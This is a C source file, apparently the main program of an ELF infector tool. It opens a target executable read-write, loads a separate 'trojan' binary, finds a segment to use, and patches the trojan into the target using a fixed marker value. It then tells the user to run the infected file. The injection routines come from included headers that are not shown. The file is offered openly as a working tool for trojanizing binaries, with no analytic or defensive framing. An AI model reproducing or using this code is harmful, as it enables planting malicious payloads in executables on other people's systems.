/**
 *  MIT License
 *
 *  Copyright (c) 2021 Carlos Carvalho
 *
 *  Permission is hereby granted, free of charge, to any person obtaining a copy
 *  of this software and associated documentation files (the "Software"), to deal
 *  in the Software without restriction, including without limitation the rights
 *  to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 *  copies of the Software, and to permit persons to whom the Software is
 *  furnished to do so, subject to the following conditions:
 *
 *  The above copyright notice and this permission notice shall be included in all
 *  copies or substantial portions of the Software.
 *
 *  THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 *  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 *  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 *  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 *  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 *  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 *  SOFTWARE.
 */

#include <string.h>
#include <errno.h>
#include <assert.h>
#include <unistd.h>
#include <assert.h>

#include "common.h"
#include "utils.h"
#include "log.h"
#include "elfo.h"
#include "parse.h"
#include "map.h"
#include "asm.h"
#include "print.h"
#include "validate.h"
#include "destroy.h"
#include "infect.h"

extern elf_info_t   _program[];

static bool doit(const char *binfile, const char *trojan) {
    ASSERT_CON_RET_FALSE(binfile && trojan);
    open_mode_t m1,m2;
    struct mapped_file map = {0}, src_map = {0};
    bool rc = false;
    const char *file = binfile;

    FILE *fp = file_open_rw(file, &m1);
    if (!fp) {
        log_error("Can't open target ELF\n");
        return rc;
    }

    FILE *trojanfp = file_open_ro(trojan, &m2);
    if (!trojanfp) {
        log_error("Can't open trojan binary\n");
        return rc;
    }

    if(!elf_validate_filetype(fp)) {
        log_error("Not a valid ELF file\n");
        return rc;
    }

    if (!(rc = file_load_target(&map, fp, m1))) {
        log_error("Error loading target ELF\n");
        return rc;
    }
    // File is mapped
    file_close(fp);

    if (!(rc = file_load_source(&src_map, trojanfp /** RO */))) {
        log_error("Error loading source binary\n");
        return rc;
    }

    elf_t *elfo = elf_parse_file(file, &map);
    if (elfo) {
        long magic = (long)0x1122334455667788;

        infect_t *inf = inf_load(elfo, m1, magic, &src_map);
        if (inf) {
            if (inf_scan_segment(inf)) {
                if ((rc = inf_load_and_patch(inf)) == true) {
                    // Make sure it is written
                    if (file_sync_target(&map))
                        printf("Done!\nTry running %s\n", file);
                }
                else
                    printf("Failed :(\n");
            }
            free(inf->trojan);
            free(inf);
        }

        assert(elf_destroy_all(elfo));
    }

    file_close(trojanfp);

    return rc;
}
int main(int argc, char **argv)
{
    if (argc < 3) {
        log_info("Use %s <elf file> <trojanfp>\n", argv[0]);
        asm_exit(0);
    }

    if (!doit(argv[1], argv[2]))
        return 1;

    return 0;
}
